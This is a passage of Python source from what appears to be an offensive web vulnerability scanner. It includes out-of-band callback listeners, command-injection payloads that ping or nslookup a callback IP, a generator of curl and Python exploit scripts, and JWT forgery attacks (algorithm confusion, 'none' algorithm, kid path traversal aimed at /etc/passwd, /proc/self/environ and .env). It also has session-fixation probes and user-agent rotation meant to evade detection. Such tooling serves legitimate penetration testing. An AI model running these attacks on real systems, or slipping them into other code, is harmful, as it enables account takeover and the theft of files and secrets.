                            conn.send(b"220 OOB SMTP Server Ready\r\n")
                        conn.close()
                    except Exception as e:
                        logging.warning(f"SMTP listener error: {e}")
            
            self.thread = threading.Thread(target=smtp_listener, daemon=True)
            self.thread.start()
            logging.info(f"SMTP OOB server started on {self.bind}:{self.port}")
            return True
        except Exception as e:
            logging.error(f"Failed to start SMTP OOB server: {e}")
            return False
    
    def stop(self):
        """Stop SMTP server"""
        if self.server:
            self.server.close()
        if self.thread:
            self.thread.join(timeout=1)

def get_smtp_oob_payloads(oob_domain, oob_ip):
    """Generate mailto:// and email-based OOB payloads"""
    return [
        f"mailto:test@{oob_domain}",
        f"mailto:exploit@{oob_domain}?subject=OOB_TEST",
        f"mailto:user@{oob_domain}?body={OOB_MARKER}",
        f"test@{oob_domain}",
        f"admin@{oob_domain}",
        f"webmaster@{oob_domain}",
        f"noreply@{oob_domain}",
        f"support@{oob_domain}",
    ]

# ---------------------------------------------------------------------
# ICMP OOB CALLBACK LISTENER
# ---------------------------------------------------------------------
icmp_oob_results = []
icmp_oob_lock = threading.Lock()

class ICMPOOBListener:
    """Listen for ICMP ping-based OOB callbacks"""
    
    def __init__(self):
        self.thread = None
        self.running = False
    
    def start(self):
        """Start ICMP listener (requires admin privileges)"""
        try:
            import socket
            import struct
            
            # Test socket creation before starting thread to fail gracefully
            try:
                test_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                test_socket.close()
            except PermissionError:
                logging.warning("ICMP OOB listener disabled: requires administrator/root privileges. Run as administrator or use alternative OOB methods.")
                return False
            except OSError as e:
                logging.warning(f"ICMP OOB listener disabled: {e}. Raw sockets not available on this system.")
                return False
            
            def icmp_listener():
                self.running = True
                try:
                    # Create raw socket (requires admin/root)
                    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    icmp_socket.bind(("127.0.0.1", 0))
                    icmp_socket.settimeout(1)
                    
                    while self.running:
                        try:
                            data, addr = icmp_socket.recvfrom(1024)
                            with icmp_oob_lock:
                                icmp_oob_results.append({
                                    'source': addr[0],
                                    'time': datetime.now().isoformat(),
                                    'data_size': len(data)
                                })
                            logging.info(f"ICMP OOB callback from {addr[0]}")
                        except socket.timeout:
                            continue
                        except Exception as e:
                            if self.running:
                                logging.warning(f"ICMP receive error: {e}")
                    icmp_socket.close()
                except PermissionError:
                    logging.warning("ICMP listener requires administrator/root privileges - disabling ICMP OOB")
                except Exception as e:
                    logging.warning(f"ICMP listener error: {e}")
            
            self.thread = threading.Thread(target=icmp_listener, daemon=True)
            self.thread.start()
            logging.info("ICMP OOB listener started")
            return True
        except Exception as e:
            logging.warning(f"Failed to start ICMP listener: {e} - ICMP OOB disabled")
            return False
    
    def stop(self):
        """Stop ICMP listener"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)

def get_icmp_oob_payloads(oob_ip):
    """Generate ICMP-based OOB payloads"""
    return [
        f"; ping -c 1 {oob_ip}",
        f"| ping {oob_ip}",
        f"&& ping -n 1 {oob_ip}",
        f"|| ping {oob_ip}",
        f"; nslookup {oob_ip}",
    ]

# ---------------------------------------------------------------------
# HTTPS OOB CALLBACK SERVER (TLS)
# ---------------------------------------------------------------------
https_oob_results = []
https_oob_lock = threading.Lock()

class HTTPSOOBHandler(BaseHTTPRequestHandler):
    """HTTPS OOB callback handler with TLS support"""
    
    def do_GET(self):
        with https_oob_lock:
            https_oob_results.append({
                'path': self.path,
                'source': self.client_address[0],
                'time': datetime.now().isoformat(),
                'protocol': 'HTTPS'
            })
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        with https_oob_lock:
            https_oob_results.append({
                'path': self.path,
                'source': self.client_address[0],
                'time': datetime.now().isoformat(),
                'method': 'POST',
                'body': body.decode('utf-8', errors='ignore')[:500],
                'protocol': 'HTTPS'
            })
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        pass

def start_https_oob_server(bind="127.0.0.1", preferred_port=None, cert_file=None, key_file=None):
    """Start HTTPS OOB server with TLS support"""
    try:
        import ssl
        from http.server import HTTPServer
        
        port = PortAllocator.get_available_port(preferred_port)
        server = HTTPServer((bind, port), HTTPSOOBHandler)
        
        # Generate self-signed certificate if not provided
        if not cert_file or not key_file:
            cert_file = "oob_cert.pem"
            key_file = "oob_key.pem"
            
            # Generate self-signed certificate using Python's cryptography library
            try:
                from cryptography import x509
                from cryptography.x509.oid import NameOID
                from cryptography.hazmat.primitives import hashes
                from cryptography.hazmat.primitives.asymmetric import rsa
                from cryptography.hazmat.primitives import serialization
                import datetime
                
                # Generate private key
                private_key = rsa.generate_private_key(
                    public_exponent=65537,
                    key_size=4096
                )
                
                # Generate certificate
                subject = issuer = x509.Name([
                    x509.NameAttribute(NameOID.COMMON_NAME, "OOB-Server"),
                ])
                cert = x509.CertificateBuilder().subject_name(
                    subject
                ).issuer_name(
                    issuer
                ).public_key(
                    private_key.public_key()
                ).serial_number(
                    x509.random_serial_number()
                ).not_valid_before(
                    datetime.datetime.utcnow()
                ).not_valid_after(
                    datetime.datetime.utcnow() + datetime.timedelta(days=365)
                ).add_extension(
                    x509.SubjectAlternativeName([
                        x509.DNSName("localhost"),
                        x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
                    ]),
                    critical=False
                ).sign(private_key, hashes.SHA256())
                
                # Write certificate and key to files
                with open(cert_file, "wb") as f:
                    f.write(cert.public_bytes(serialization.Encoding.PEM))
                with open(key_file, "wb") as f:
                    f.write(private_key.private_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PrivateFormat.TraditionalOpenSSL,
                        encryption_algorithm=serialization.NoEncryption()
                    ))
                logging.info(f"Generated self-signed certificate: {cert_file}")
            except ImportError:
                logging.warning("cryptography library not available, attempting OpenSSL subprocess")
                # Fallback to OpenSSL if cryptography not available
                try:
                    subprocess.run([
                        'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
                        '-keyout', key_file, '-out', cert_file, '-days', '365',
                        '-nodes', '-subj', '/CN=OOB-Server'
                    ], capture_output=True, check=True, timeout=10)
                    logging.info(f"Generated self-signed certificate using OpenSSL: {cert_file}")
                except (subprocess.CalledProcessError, FileNotFoundError) as e:
                    logging.error(f"Failed to generate self-signed cert: {e}")
                    # Fallback: create SSL context with proper verification
                    ssl_context = create_ssl_context(verify=False)
                    server.socket = ssl_context.wrap_socket(server.socket, server_side=True)
                    thread = threading.Thread(target=server.serve_forever, daemon=True)
                    thread.start()
                    return server, port
            except Exception as e:
                logging.error(f"Failed to generate self-signed cert: {e}")
                # Fallback: create SSL context with proper verification
                ssl_context = create_ssl_context(verify=False)
                server.socket = ssl_context.wrap_socket(server.socket, server_side=True)
                thread = threading.Thread(target=server.serve_forever, daemon=True)
                thread.start()
                return server, port
        
        # Load certificate and key
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain(certfile=cert_file, keyfile=key_file)
        server.socket = ssl_context.wrap_socket(server.socket, server_side=True)
        
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        logging.info(f"HTTPS OOB server started on {bind}:{port}")
        return server, port
        
    except Exception as e:
        logging.error(f"Failed to start HTTPS OOB server: {e}")
        return None, None

async def check_dns_callback(marker, domain, server_ip):
    if not DNS_AVAILABLE or not server_ip:
        return False
    # Retry logic: check 3 times with 10-second intervals
    for attempt in range(3):
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [server_ip]
            answers = resolver.resolve(f"{marker}.{domain}", 'A')
            for rdata in answers:
                return True
        except Exception as e:
            logging.warning(f"DNS callback check error (attempt {attempt + 1}/3): {e}")
            if attempt < 2:
                await asyncio.sleep(10)
    return False

async def get_public_ip():
    """Get public IP address (ASYNC VERSION)"""
    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.ipify.org", timeout=aiohttp.ClientTimeout(total=5)) as response:
                return (await response.text()).strip()
    except Exception as e:
        logging.warning(f"Failed to get public IP: {e}")
        return "127.0.0.1"

# ---------------------------------------------------------------------
# EXPLOITATION PoC GENERATOR
# ---------------------------------------------------------------------
class ExploitPoCGenerator:
    """Generate automated exploitation Proof of Concept scripts"""
    
    @staticmethod
    def generate_curl_poc(vuln):
        """Generate curl command for exploitation"""
        vuln_type = vuln.get('type', 'Unknown')
        url = vuln.get('url', '')
        parameter = vuln.get('parameter', 'N/A')
        payload = vuln.get('payload', '')
        method = vuln.get('method', 'GET')
        
        if not url:
            return "# Insufficient data for PoC generation - missing URL"
        
        curl_cmd = f"curl -X {method} '{url}'"
        
        if payload and payload != 'N/A':
            if method == 'POST':
                curl_cmd += f" -d '{parameter}={payload}'"
            else:
                curl_cmd += f" -G -d '{parameter}={payload}'"
        
        curl_cmd += " -v"
        
        return f"""# Exploitation PoC for {vuln_type}
# Target: {url}
# Parameter: {parameter}
# Payload: {payload if payload and payload != 'N/A' else 'See vulnerability details'}
# Method: {method}

{curl_cmd}
"""
    
    @staticmethod
    def generate_python_poc(vuln):
        """Generate Python script for exploitation"""
        vuln_type = vuln.get('type', 'Unknown')
        url = vuln.get('url', '')
        parameter = vuln.get('parameter', 'N/A')
        payload = vuln.get('payload', '')
        method = vuln.get('method', 'GET')
        
        if not url:
            return "# Insufficient data for PoC generation - missing URL"
        
        payload_value = payload if payload and payload != 'N/A' else 'See vulnerability details'
        
        python_code = f"""#!/usr/bin/env python3
import requests
from urllib.parse import quote

# Exploitation PoC for {vuln_type}
# Target: {url}
# Parameter: {parameter}
# Payload: {payload_value}
# Method: {method}

target_url = "{url}"
parameter = "{parameter}"

try:
    if '{method}' == 'GET':
        # GET request
        exploit_url = target_url
        if parameter != 'N/A':
            exploit_url = f"{{target_url}}?{{parameter}}={{quote('{payload_value}', safe='')}}"
        response = requests.get(exploit_url, timeout=10)
    else:
        # POST request
        data = {{parameter: '{payload_value}'}} if parameter != 'N/A' else {{}}
        response = requests.post(target_url, data=data, timeout=10)
    
    print(f"Status: {{response.status_code}}")
    print(f"Response: {{response.text[:500]}}")
    
except Exception as e:
    print(f"Error: {{e}}")
"""
        return python_code
    
    @staticmethod
    def generate_all_pocs(vuln):
        """Generate both curl and Python PoCs"""
        return {
            'curl': ExploitPoCGenerator.generate_curl_poc(vuln),
            'python': ExploitPoCGenerator.generate_python_poc(vuln)
        }

# ---------------------------------------------------------------------
# JWT ATTACK MODULE
# ---------------------------------------------------------------------
class JWTAttack:
    """JWT security attack implementations for algorithm confusion, kid traversal, and session fixation"""
    
    @staticmethod
    def extract_jwt_from_request(request_data):
        """Extract JWT token from request headers, cookies, or body"""
        jwt_token = None
        
        # Check Authorization header
        if 'headers' in request_data:
            auth_header = request_data['headers'].get('Authorization', '')
            if auth_header.startswith('Bearer '):
                jwt_token = auth_header[7:]
        
        # Check cookies
        if 'cookies' in request_data and not jwt_token:
            for cookie_name, cookie_value in request_data['cookies'].items():
                # Common JWT cookie names
                if cookie_name.lower() in ['jwt', 'token', 'access_token', 'id_token', 'auth_token']:
                    jwt_token = cookie_value
                    break
                # Check if cookie value looks like JWT (3 parts separated by dots)
                if isinstance(cookie_value, str) and cookie_value.count('.') == 2:
                    jwt_token = cookie_value
                    break
        
        # Check body parameters
        if 'body' in request_data and not jwt_token:
            body = request_data['body']
            if isinstance(body, dict):
                for key, value in body.items():
                    if key.lower() in ['jwt', 'token', 'access_token', 'id_token', 'auth_token']:
                        jwt_token = value
                        break
                    if isinstance(value, str) and value.count('.') == 2:
                        jwt_token = value
                        break
        
        return jwt_token
    
    @staticmethod
    def decode_jwt_header(jwt_token):
        """Decode and return JWT header without verification"""
        try:
            header_b64 = jwt_token.split('.')[0]
            # Add padding if needed
            header_b64 += '=' * (4 - len(header_b64) % 4)
            header_json = base64.urlsafe_b64decode(header_b64)
            return json.loads(header_json)
        except Exception as e:
            logging.error(f"Failed to decode JWT header: {e}")
            return None
    
    @staticmethod
    def decode_jwt_payload(jwt_token):
        """Decode and return JWT payload without verification"""
        try:
            payload_b64 = jwt_token.split('.')[1]
            # Add padding if needed
            payload_b64 += '=' * (4 - len(payload_b64) % 4)
            payload_json = base64.urlsafe_b64decode(payload_b64)
            return json.loads(payload_json)
        except (json.JSONDecodeError, ValueError, IndexError, binascii.Error) as e:
            logging.error(f"Failed to decode JWT payload: {e}")
            return None
    
    @staticmethod
    def algorithm_confusion_attack(jwt_token, public_key=None):
        """
        Algorithm Confusion Attack: RS256 → HS256
        Extract JWT, convert 'alg' header from RS256 to HS256, re-sign using RSA public key
        Returns forged JWT if successful, None otherwise
        """
        try:
            header = JWTAttack.decode_jwt_header(jwt_token)
            payload = JWTAttack.decode_jwt_payload(jwt_token)
            signature = jwt_token.split('.')[2] if len(jwt_token.split('.')) > 2 else ''
            
            if not header or not payload:
                logging.warning("Failed to decode JWT for algorithm confusion attack")
                return None
            
            # Check if original algorithm is RS256
            original_alg = header.get('alg', '')
            if original_alg != 'RS256':
                logging.info(f"Original algorithm is {original_alg}, not RS256. Attack may not work.")
            
            # Modify header to use HS256
            header['alg'] = 'HS256'
            
            # If no public key provided, try to extract from /.well-known/jwks.json
            if not public_key:
                logging.warning("No public key provided for algorithm confusion attack")
                return None
            
            # Re-sign the token using the public key as the HMAC secret
            # This is the core of the attack: using the public key as the HMAC secret
            new_header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            new_payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            
            # Sign with public key as secret
            signing_input = f"{new_header_b64}.{new_payload_b64}"
            new_signature = pyjwt.encode(payload, public_key, algorithm='HS256', headers=header)
            
            forged_jwt = new_signature
            logging.info("Algorithm confusion attack: Successfully forged JWT with HS256 using public key")
            
            return {
                'original_token': jwt_token,
                'forged_token': forged_jwt,
                'attack_type': 'Algorithm Confusion (RS256→HS256)',
                'original_alg': original_alg,
                'new_alg': 'HS256',
                'severity': 'CRITICAL',
                'description': 'Account takeover possible - server accepts HS256 signature with public key'
            }
            
        except Exception as e:
            logging.error(f"Algorithm confusion attack failed: {e}")
            return None
    
    @staticmethod
    def kid_path_traversal_attack(jwt_token, target_paths=None):
        """
        kid Path Traversal Attack (CVE-2018-0114)
        Modify JWT header to use path traversal in 'kid' parameter
        Test various file paths to see if server reads files via JWT library
        """
        if target_paths is None:
            target_paths = [
                "../../../../dev/null",
                "../../../../etc/passwd",
                "../../../../windows/win.ini",
                "../../../dev/null",
                "../../dev/null",
                "/dev/null",
                "null",
                "",
                "../../../../proc/self/environ",
                "../../../../.env",
            ]
        
        try:
            header = JWTAttack.decode_jwt_header(jwt_token)
            payload = JWTAttack.decode_jwt_payload(jwt_token)
            
            if not header or not payload:
                logging.warning("Failed to decode JWT for kid path traversal attack")
                return None
            
            results = []
            
            for path in target_paths:
                try:
                    # Create modified header with path traversal in kid
                    modified_header = header.copy()
                    modified_header['alg'] = 'HS256'
                    modified_header['kid'] = path
                    
                    # Sign with empty key (since we're targeting /dev/null or similar)
                    new_header_b64 = base64.urlsafe_b64encode(json.dumps(modified_header).encode()).decode().rstrip('=')
                    new_payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                    
                    # Sign with empty string as key
                    signing_input = f"{new_header_b64}.{new_payload_b64}"
                    new_signature = pyjwt.encode(payload, '', algorithm='HS256', headers=modified_header)
                    
                    forged_jwt = new_signature
                    
                    results.append({
                        'kid_path': path,
                        'forged_token': forged_jwt,
                        'attack_type': 'kid Path Traversal',
                        'severity': 'HIGH',
                        'description': f'Attempting to read file via kid parameter: {path}'
                    })
                    
                except Exception as e:
                    logging.debug(f"Failed to create forged token for path {path}: {e}")
                    continue
            
            if results:
                logging.info(f"kid path traversal attack: Generated {len(results)} forged tokens")
                return results
            else:
                return None
                
        except Exception as e:
            logging.error(f"kid path traversal attack failed: {e}")
            return None
    
    @staticmethod
    async def session_fixation_ambiguity_attack(base_url, session_cookie_name='session', session=None):
        """
        Session Fixation/Ambiguity Attack (ASYNC VERSION)
        Send two cookies with same name in same request to test server prioritization
        Check if server prioritizes first or last cookie (leads to session hijacking)
        """
        try:
            import aiohttp
            
            # Generate two different session values
            original_session = "original_session_" + str(uuid.uuid4())
            malicious_session = "malicious_session_" + str(uuid.uuid4())
            
            results = []
            
            # Create session if not provided
            close_session = False
            if session is None:
                session = aiohttp.ClientSession()
                close_session = True
            
            try:
                # Test 1: Send original first, malicious last
                headers = {
                    'Cookie': f'{session_cookie_name}={original_session}; {session_cookie_name}={malicious_session}'
                }
                
                async with session.get(base_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response1:
                    results.append({
                        'test': 'original_first_malicious_last',
                        'cookies_sent': f'{session_cookie_name}={original_session}; {session_cookie_name}={malicious_session}',
                        'response_status': response1.status,
                        'interpretation': 'Check which session was accepted by server'
                    })
                
                # Test 2: Send malicious first, original last
                headers = {
                    'Cookie': f'{session_cookie_name}={malicious_session}; {session_cookie_name}={original_session}'
                }
                
                async with session.get(base_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response2:
                    results.append({
                        'test': 'malicious_first_original_last',
                        'cookies_sent': f'{session_cookie_name}={malicious_session}; {session_cookie_name}={original_session}',
                        'response_status': response2.status,
                        'interpretation': 'Check which session was accepted by server'
                    })
                
                # Test 3: Send via Cookie header and cookie param
                headers = {
                    'Cookie': f'{session_cookie_name}={original_session}'
                }
                
                async with session.get(base_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response3:
                    results.append({
                        'test': 'header_and_cookie_param',
                        'header_cookie': f'{session_cookie_name}={original_session}',
                        'response_status': response3.status,
                        'interpretation': 'Check if Cookie header takes precedence'
                    })
                
                if results:
                    logging.info(f"Session fixation ambiguity attack completed: {len(results)} tests")
                    return results
                else:
                    return None
            finally:
                if close_session:
                    await session.close()
                    
        except Exception as e:
            logging.error(f"Session fixation ambiguity attack failed: {e}")
            return None
    
    @staticmethod
    def none_algorithm_attack(jwt_token):
        """
        None Algorithm Attack
        Modify JWT header to use 'none' algorithm with empty signature
        """
        try:
            header = JWTAttack.decode_jwt_header(jwt_token)
            payload = JWTAttack.decode_jwt_payload(jwt_token)
            
            if not header or not payload:
                logging.warning("Failed to decode JWT for none algorithm attack")
                return None
            
            # Modify header to use none algorithm
            header['alg'] = 'none'
            
            # Create token with empty signature
            new_header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            new_payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            
            forged_jwt = f"{new_header_b64}.{new_payload_b64}."
            
            logging.info("None algorithm attack: Successfully forged JWT with none algorithm")
            
            return {
                'original_token': jwt_token,
                'forged_token': forged_jwt,
                'attack_type': 'None Algorithm',
                'severity': 'CRITICAL',
                'description': 'Server accepts JWT with none algorithm and no signature'
            }
            
        except Exception as e:
            logging.error(f"None algorithm attack failed: {e}")
            return None
    
    @staticmethod
    async def extract_public_key_from_jwks(target_url, session=None):
        """
        Extract RSA public key from /.well-known/jwks.json endpoint (ASYNC VERSION)
        Returns public key in PEM format if found
        """
        try:
            import aiohttp
            
            jwks_url = urljoin(target_url, '/.well-known/jwks.json')
            
            close_session = False
            if session is None:
                session = aiohttp.ClientSession()
                close_session = True
            
            try:
                async with session.get(jwks_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    if response.status != 200:
                        logging.warning(f"JWKS endpoint not accessible: {jwks_url}")
                        return None
                    
                    jwks_data = await response.json()
                
                if 'keys' not in jwks_data or not jwks_data['keys']:
                    logging.warning("No keys found in JWKS response")
                    return None
                
                # Get first key (usually RSA)
                key_data = jwks_data['keys'][0]
                
                # Convert JWK to PEM format
                from cryptography.hazmat.primitives.asymmetric import rsa
                from cryptography.hazmat.primitives import serialization
                from cryptography.hazmat.backends import default_backend
                
                if key_data.get('kty') != 'RSA':
                    logging.warning(f"Key type is {key_data.get('kty')}, not RSA")
                    return None
                
                # Extract modulus and exponent
                n = int.from_bytes(base64.urlsafe_b64decode(key_data['n'] + '=='), 'big')
                e = int.from_bytes(base64.urlsafe_b64decode(key_data['e'] + '=='), 'big')
                
                # Create RSA public key
                public_key = rsa.RSAPublicNumbers(e, n).public_key(default_backend())
                
                # Convert to PEM format
                pem = public_key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                )
                
                logging.info("Successfully extracted RSA public key from JWKS endpoint")
                return pem.decode('utf-8')
            finally:
                if close_session:
                    await session.close()
                    
        except ImportError:
            logging.warning("cryptography library not available for JWKS parsing")
            return None
        except Exception as e:
            logging.error(f"Failed to extract public key from JWKS: {e}")
            return None

# ---------------------------------------------------------------------
# UTILITY CLASSES
# ---------------------------------------------------------------------
class UserAgentRotator:
    """Rotate user agents to avoid detection"""
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    ]
    
    def __init__(self, user_agents=None):
        self.user_agents = user_agents or self.USER_AGENTS
        self.current_index = 0
        self.lock = threading.Lock()
    
    def get_random(self):
        """Get a random user agent"""
        with self.lock:
            return random.choice(self.user_agents)
    
    def get_next(self):
        """Get next user agent in rotation"""
        with self.lock:
            ua = self.user_agents[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.user_agents)
            return ua

class TokenNormalizer:
    @staticmethod
    def normalize(text):
        text = re.sub(r'\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b', 'UUID', text)
        text = re.sub(r'\b\d{10}\b', 'TIMESTAMP', text)
        text = re.sub(r'"_token"\s*:\s*"[^"]+"', '"_token":"CSRF"', text)
        text = re.sub(r'<input[^>]+name=["\']_token["\'][^>]+value=["\'][^"\']+["\']', '<input name="_token" value="CSRF">', text)
        text = re.sub(r'\b\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}.\d+Z\b', 'ISO_DATE', text)
        return text

class BaselineCache:
    def __init__(self):
        self._cache = {}
        self.lock = asyncio.Lock()
    async def get(self, key):
        async with self.lock:
            return self._cache.get(key)
    async def set(self, key, val):
        async with self.lock:
            self._cache[key] = val

class AsyncRateLimiter:
    def __init__(self, base_delay, jitter=0.05):
        self.base_delay = base_delay
        self.lock = asyncio.Lock()
        self.last_request = 0.0
        self.jitter = jitter
        try:
            self.loop = asyncio.get_running_loop()
        except RuntimeError:
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
    async def wait(self):
        async with self.lock:
            now = self.loop.time()
            elapsed = now - self.last_request
            delay = self.base_delay + random.uniform(-self.jitter, self.jitter)
            if self.base_delay <= 0:
                return
            if elapsed < delay:
                await asyncio.sleep(delay - elapsed)
            self.last_request = self.loop.time()

class AsyncSession:
    def __init__(self, loop=None, proxy=None, user_agent_rotator=None):
        if loop is None:
            try:
                self.loop = asyncio.get_running_loop()
            except RuntimeError:
                self.loop = asyncio.new_event_loop()
                asyncio.set_event_loop(self.loop)
        else:
            self.loop = loop
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        connector = aiohttp.TCPConnector(limit=500, force_close=False, ssl=ssl_context)
        self.user_agent_rotator = user_agent_rotator or UserAgentRotator()
        self.session = aiohttp.ClientSession(
            loop=self.loop,
            connector=connector,
            headers={"User-Agent": self.user_agent_rotator.get_random()},
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        )
    async def request(self, method, url, **kwargs):
        async with self.session.request(method, url, **kwargs) as resp:
            # Stream response to avoid OOM on large files; store only first 10KB for evidence
            body_chunks = []
            total_size = 0
            max_evidence_size = 10 * 1024  # 10KB
            async for chunk in resp.content.iter_chunked(8192):
                if total_size < max_evidence_size:
                    body_chunks.append(chunk)
                    total_size += len(chunk)
                # Continue consuming stream without storing to avoid OOM
            resp._body = b''.join(body_chunks).decode('utf-8', errors='ignore')
            return resp
    async def close(self):
        await self.session.close()

class JSRenderDriver:
    def __init__(self, proxy=None):
        self.driver = None
        self.proxy = proxy
        self.captured_requests = deque(maxlen=1000)  # Prevent memory leak with bounded deque
        self.lock = threading.Lock()
        self.spa_routes_clicked = set()
    
    def __enter__(self):
        """Context manager entry"""
        self.create()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit - ensures driver cleanup"""
        self.quit()
        return False
    
    def create(self):
        opts = Options()
        opts.add_argument("--headless")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-dev-shm-usage")
        opts.add_experimental_option("excludeSwitches", ["enable-logging"])
        if self.proxy:
            opts.add_argument(f'--proxy-server={self.proxy}')
        try:
            self.driver = webdriver.Chrome(options=opts)
            self.driver.set_page_load_timeout(15)
            self.driver.execute_cdp_cmd("Network.enable", {})
            # Use Selenium 4 CDP API
            try:
                self.driver.execute_cdp_cmd("Network.enable", {})
                logging.info("CDP network monitoring enabled")
            except Exception as cdp_error:
                logging.warning(f"CDP network monitoring unavailable: {cdp_error}")
            return True
        except Exception as e:
            logging.warning(f"Selenium driver creation error: {e}")
            return False
    def _capture_request(self, data):
        with self.lock:
            self.captured_requests.append({'type': 'request', 'url': data['request']['url'], 'method': data['request']['method']})
    def _capture_response(self, data):
        try:
            body = self.driver.execute_cdp_cmd("Network.getResponseBody", {"requestId": data['requestId']})
            b = body.get('body', '')
        except Exception as e:
            logging.warning(f"CDP response body error: {e}")
            b = ''
        with self.lock:
            parsed_params = self._extract_json_parameters(b) if b else []
            self.captured_requests.append({'type': 'response', 'url': data['response']['url'], 'status': data['response']['status'], 'body': b, 'parameters': parsed_params})

    def _extract_json_parameters(self, body, prefix=''):
        """Recursively parse JSON to extract deep parameters"""
        params = []
        try:
            data = json.loads(body)
            def traverse(obj, current_prefix=''):
                if isinstance(obj, dict):
                    for key, value in obj.items():
                        new_prefix = f"{current_prefix}.{key}" if current_prefix else key
                        if isinstance(value, (dict, list)):
                            traverse(value, new_prefix)
                        else:
                            params.append(new_prefix)
                elif isinstance(obj, list):
                    for i, item in enumerate(obj):
                        new_prefix = f"{current_prefix}[{i}]"
                        if isinstance(item, (dict, list)):
                            traverse(item, new_prefix)
                        else:
                            params.append(new_prefix)
            traverse(data, prefix)
        except (json.JSONDecodeError, ValueError) as e:
            logging.warning(f"JSON parsing error in parameter extraction: {e}")
        return params
    def get(self, url):
        if not self.driver:
            return ""
        try:
            self.driver.get(url)
            WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
            return self.driver.page_source
        except Exception as e:
            logging.warning(f"Selenium get error: {e}")
            return self.driver.page_source if self.driver else ""
    def check_alerts(self):
        alerts = []
        if self.driver:
            try:
                while True:
                    a = self.driver.switch_to.alert
                    alerts.append(a.text)
                    a.accept()
            except NoAlertPresentException as e:
                logging.debug(f"No alert present: {e}")
        return alerts
    def execute_js(self, script):
        if self.driver:
            try:
                return self.driver.execute_script(script)
            except Exception as e:
                logging.warning(f"Selenium execute JS error: {e}")
                return None
        return None
    def quit(self):
        """Ensure driver is properly cleaned up to prevent memory leaks"""
        if self.driver:
            try:
                self.driver.quit()
                self.driver = None
            except Exception as e:
                logging.warning(f"Selenium quit error: {e}")
                self.driver = None  # Ensure reference is cleared even on error

    def click_spa_routes(self, url, max_routes=50):
        """Click SPA client-side routes (#!, #/, etc.)"""
        if not self.driver:
            return []
        clicked = []
        try:
            # Validate URL before attempting to load
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                logging.warning(f"Invalid URL skipped for SPA routes: {url}")
                return []
            if parsed.scheme not in ('http', 'https'):
                logging.warning(f"Unsupported scheme skipped for SPA routes: {url}")
                return []
            self.driver.get(url)
            WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
            
            # Find all elements with href containing #! or #/
            spa_links = self.driver.find_elements(By.XPATH, "//a[contains(@href, '#!') or contains(@href, '#/')]")
            for link in spa_links[:max_routes]:
                try:
                    href = link.get_attribute('href')
                    if href and href not in self.spa_routes_clicked:
                        self.driver.execute_script("arguments[0].click();", link)
                        time.sleep(0.5)
                        self.spa_routes_clicked.add(href)
                        clicked.append(href)
                        self.log(f"Clicked SPA route: {href}")
                except Exception as e:
                    logging.warning(f"SPA click error: {e}")
            return clicked
        except Exception as e:
            logging.warning(f"SPA route clicking error: {e}")
            return clicked

    def log(self, msg):
        logging.info(msg)

class FP_Database:
    def __init__(self, db_path="fp_learn.db"):
